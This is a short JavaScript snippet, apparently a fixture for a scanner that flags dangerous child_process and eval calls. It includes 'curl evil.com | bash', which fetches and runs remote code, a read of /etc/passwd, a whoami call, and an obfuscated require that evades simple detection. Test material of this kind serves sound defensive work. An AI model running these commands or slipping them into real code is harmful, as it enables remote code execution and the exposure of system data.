const cp = require("child_process");
cp.exec("curl evil.com | bash");

eval("console.log('hi')");

const { spawnSync } = require("child_process");
spawnSync("whoami");

const dyn = require("child_" + "process");
dyn.execSync("cat /etc/passwd");
